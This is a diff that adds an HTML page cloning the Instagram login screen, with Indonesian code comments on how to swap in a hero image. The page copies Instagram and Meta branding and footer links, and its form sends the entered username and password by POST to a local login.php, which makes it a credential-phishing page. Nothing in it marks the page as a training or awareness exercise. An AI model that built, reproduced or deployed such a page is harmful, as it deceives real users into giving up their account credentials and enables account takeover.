@@ -1,0 +1,340 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Instagram</title>
+  <link rel="icon" href="https://static.cdninstagram.com/rsrc.php/v3/yI/r/VsNE-OHk_8a.png"/>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+
+    body {
+      background: #000;
+      color: #fff;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .main {
+      display: flex;
+      flex: 1;
+    }
+
+    /* ===== LEFT PANEL ===== */
+    .left {
+      flex: 1;
+      background: #000;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: flex-start;
+      padding: 60px 80px;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .ig-icon {
+      width: 56px;
+      height: 56px;
+      margin-bottom: 32px;
+      /* Ganti src img di bawah jika ingin pakai gambar lokal */
+    }
+
+    .left h1 {
+      font-size: 52px;
+      font-weight: 700;
+      line-height: 1.1;
+      max-width: 480px;
+    }
+
+    .left h1 .highlight-orange { color: #f58529; }
+    .left h1 .highlight-pink   { color: #dd2a7b; }
+
+    /* Phone/image area — GANTI dengan gambar asli jika punya */
+    .left-image {
+      width: 480px;
+      height: 380px;
+      margin-top: 48px;
+      background: #1a1a1a;
+      border-radius: 16px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #444;
+      font-size: 14px;
+      /* Uncomment baris di bawah & ganti path jika punya gambarnya: */
+      /* background: url('hero.png') no-repeat center/cover; */
+    }
+
+    /* ===== RIGHT PANEL ===== */
+    .right {
+      width: 480px;
+      flex-shrink: 0;
+      background: #000;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: stretch;
+      padding: 48px 40px;
+      border-left: 1px solid #262626;
+    }
+
+    .right-header {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin-bottom: 40px;
+    }
+
+    .right-header .back-btn {
+      background: none;
+      border: none;
+      color: #fff;
+      font-size: 22px;
+      cursor: pointer;
+      padding: 4px;
+    }
+
+    .right-header h2 {
+      font-size: 20px;
+      font-weight: 600;
+    }
+
+    form {
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+    }
+
+    input {
+      width: 100%;
+      padding: 16px 14px;
+      background: #121212;
+      border: 1px solid #363636;
+      border-radius: 12px;
+      color: #fff;
+      font-size: 16px;
+      outline: none;
+      transition: border-color 0.2s;
+    }
+
+    input::placeholder { color: #888; }
+    input:focus { border-color: #555; }
+
+    .btn-login {
+      width: 100%;
+      padding: 16px;
+      background: #1877f2;
+      color: #fff;
+      border: none;
+      border-radius: 12px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      margin-top: 4px;
+      transition: background 0.2s;
+    }
+
+    .btn-login:hover { background: #1565d8; }
+
+    .forgot {
+      text-align: center;
+      margin-top: 12px;
+      font-size: 14px;
+      color: #e0e0e0;
+      cursor: pointer;
+      text-decoration: none;
+    }
+
+    .forgot:hover { text-decoration: underline; }
+
+    .divider {
+      display: flex;
+      align-items: center;
+      gap: 16px;
+      margin: 24px 0;
+      color: #555;
+      font-size: 13px;
+      font-weight: 600;
+    }
+    .divider::before, .divider::after {
+      content: '';
+      flex: 1;
+      height: 1px;
+      background: #363636;
+    }
+
+    .btn-facebook {
+      width: 100%;
+      padding: 14px;
+      background: transparent;
+      color: #fff;
+      border: 1px solid #363636;
+      border-radius: 12px;
+      font-size: 15px;
+      font-weight: 600;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      text-decoration: none;
+      transition: background 0.2s;
+    }
+
+    .btn-facebook:hover { background: #111; }
+
+    .fb-icon {
+      width: 20px;
+      height: 20px;
+    }
+
+    .btn-create {
+      width: 100%;
+      padding: 14px;
+      background: transparent;
+      color: #1877f2;
+      border: 1px solid #1877f2;
+      border-radius: 12px;
+      font-size: 15px;
+      font-weight: 600;
+      cursor: pointer;
+      text-decoration: none;
+      display: block;
+      text-align: center;
+      margin-top: 12px;
+      transition: background 0.2s;
+    }
+
+    .btn-create:hover { background: #0a1929; }
+
+    .meta-logo {
+      text-align: center;
+      margin-top: 32px;
+      color: #555;
+      font-size: 13px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+    }
+
+    .meta-logo svg { width: 48px; fill: #555; }
+
+    /* ===== FOOTER ===== */
+    footer {
+      background: #000;
+      border-top: 1px solid #1a1a1a;
+      padding: 20px 40px;
+      text-align: center;
+      font-size: 12px;
+      color: #555;
+    }
+
+    footer a {
+      color: #555;
+      text-decoration: none;
+      margin: 0 6px;
+    }
+    footer a:hover { color: #888; }
+
+    .footer-bottom {
+      margin-top: 10px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .lang-select {
+      background: transparent;
+      border: none;
+      color: #555;
+      font-size: 12px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+
+<div class="main">
+  <!-- LEFT PANEL -->
+  <div class="left">
+    <!-- Instagram icon — ganti src jika ingin pakai lokal -->
+    <img class="ig-icon" src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram" />
+
+    <h1>
+      See everyday moments from your
+      <span class="highlight-orange">close </span><span class="highlight-pink">friends</span>.
+    </h1>
+
+    <!--
+      CARA INSERT GAMBAR HERO:
+      1. Simpan gambar di folder yang sama dengan index.html
+      2. Ganti konten div .left-image menjadi:
+         <img src="NAMA_FILE_GAMBAR.png" style="width:480px;border-radius:16px;" />
+      Atau uncomment background di CSS .left-image dan isi path-nya.
+    -->
+    <div class="left-image">
+      <img src="Screenshot 2026-05-24 103309.png" style="width:480px; border-radius:16px;" />
+    </div>
+  </div>
+
+  <!-- RIGHT PANEL -->
+  <div class="right">
+    <div class="right-header">
+      <button class="back-btn">&#8592;</button>
+      <h2>Log into Instagram</h2>
+    </div>
+
+    <form action="login.php" method="POST">
+      <input type="text"     name="username" placeholder="Mobile number, username or email" required autocomplete="username" />
+      <input type="password" name="password" placeholder="Password" required autocomplete="current-password" />
+      <button type="submit" class="btn-login">Log in</button>
+    </form>
+
+    <a href="#" class="forgot">Forgot password?</a>
+
+    <div class="divider">OR</div>
+
+    <a href="#" class="btn-facebook">
+      <!-- Facebook icon inline SVG -->
+      <svg class="fb-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="#1877f2">
+        <path d="M24 12.073C24 5.405 18.627 0 12 0S0 5.405 0 12.073C0 18.1 4.388 23.094 10.125 24v-8.437H7.078v-3.49h3.047V9.413c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.49h-2.796V24C19.612 23.094 24 18.1 24 12.073z"/>
+      </svg>
+      Log in with Facebook
+    </a>
+
+    <a href="#" class="btn-create">Create new account</a>
+
+    <div class="meta-logo">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 40">
+        <text x="0" y="32" font-size="32" font-family="Arial" font-weight="bold" fill="#555">∞ Meta</text>
+      </svg>
+    </div>
+  </div>
+</div>
+
+<!-- FOOTER -->
+<footer>
+  <div>
+    <a href="#">Meta</a><a href="#">About</a><a href="#">Blog</a><a href="#">Jobs</a>
+    <a href="#">Help</a><a href="#">API</a><a href="#">Privacy</a><a href="#">Terms</a>
+    <a href="#">Locations</a><a href="#">Popular</a><a href="#">Instagram Lite</a>
+    <a href="#">Meta AI</a><a href="#">Threads</a>
+    <a href="#">Contact Uploading &amp; Non-Users</a><a href="#">Meta Verified</a>
+    <a href="#">Meta in Indonesia</a>
+  </div>
+  <div class="footer-bottom">
+    <select class="lang-select">
+      <option>English</option>
+      <option selected>Bahasa Indonesia</option>
+    </select>
+    <span>© 2026 Instagram from Meta</span>
+  </div>
+</footer>
+
+</body>
+</html>
